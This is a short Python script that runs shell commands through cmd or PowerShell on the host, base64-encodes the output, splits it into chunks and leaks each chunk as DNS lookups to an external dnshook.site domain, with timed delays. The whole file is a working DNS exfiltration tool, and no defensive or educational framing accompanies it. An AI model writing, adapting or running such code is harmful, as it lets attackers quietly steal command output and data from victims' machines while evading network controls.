from PIL import ImageGrab
import base64
import io
import cryptocode
import subprocess
import platform
import sys
import requests
import time
import threading
import os

webhook = ".85051931-332d-4552-9814-1415091cce22.dnshook.site"
command = "dir"

#########################################################
# Shell Commands
#########################################################

def run_command_cmd(command):
    try:
        process = subprocess.Popen(["cmd", "/c", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout.decode("utf-8"), stderr.decode("utf-8")
    except Exception as e:
        return str(e), ""

def run_command_powershell(command):
    try:
        process = subprocess.Popen(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout.decode("utf-8"), stderr.decode("utf-8")
    except Exception as e:
        return str(e), ""

#########################################################
# DNS EXFILTRATION
#########################################################

import dns.resolver
def split_string(string, part_size):
    return [string[i:i+part_size] for i in range(0, len(string), part_size)]
    #return [f"{i+1:03}JJ{string[i:i+part_size]}" for i in range(0, len(string), part_size)]

def process_data(data):
    data_b64 = base64.b64encode(data.encode("utf-8")).decode("utf-8")
    #encrypted_data = cryptocode.encrypt(data_b64, chave_cripto)
    return split_string(data_b64,8)
    
def exfiltrate_command_data(command, is_packet=True):
    output = run_command_cmd(command)[0] if platform.system().lower() != "linux" else subprocess.getoutput(command)
    if is_packet:
        data = process_data(output.rstrip())
        for item in data:
            exfiltrate_data(item + webhook)
    else:
        exfiltrate_data(output.rstrip() + webhook)

def exfiltrate_data(url):
    try:
        time.sleep(10)  # Delay of 10 seconds
        dns.resolver.resolve(str(url), "A")
    except:
        return None

exfiltrate_command_data(command)
